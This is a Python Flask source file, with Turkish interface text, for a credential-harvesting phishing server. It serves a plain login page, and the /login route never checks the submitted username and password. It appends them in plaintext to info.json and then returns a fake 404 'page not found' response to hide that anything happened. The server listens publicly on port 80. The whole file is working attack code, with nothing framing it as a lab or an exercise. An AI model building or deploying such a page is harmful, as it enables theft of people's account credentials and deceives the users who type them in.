from flask import Flask, request
import json

app = Flask(__name__)

@app.route('/')
def home():
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        .login-container h2 {
            text-align: center;
            margin-bottom: 20px;
        }

        .login-container label {
            margin: 10px 0 5px;
            display: block;
            font-weight: bold;
        }

        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .login-container input:focus {
            border-color: #4CAF50;
            outline: none;
        }

        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .login-container button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Giriş Yap</h2>
        <form action="/login" method="POST">
            <label for="username">Kullanıcı Adı:</label>
            <input type="text" id="username" name="username" autocomplete="off" required>

            <label for="password">Şifre:</label>
            <input type="password" id="password" name="password" autocomplete="off" required>

            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
    '''

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Kullanıcı bilgilerini JSON dosyasına kaydet
    user_data = {"Kullanıcı Adı": username, "Şifre": password}
    
    try:
        # Dosya mevcutsa yükle, ardından yeni veriyi ekle
        with open('info.json', 'r') as file:
            data = json.load(file)
    except FileNotFoundError:
        # Dosya yoksa yeni bir liste oluştur
        data = []

    data.append(user_data)

    with open('info.json', 'w') as file:
        json.dump(data, file, indent=4)

    return '''
    <!DOCTYPE html>
    <html>
        <head>
            <title>404 Not Found</title>
        </head>
        <body>
            <h1>Sayfa Bulunamadı</h1>
            <p>Aradığınız sayfa mevcut değil.</p>
        </body>
    </html>
    ''', 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
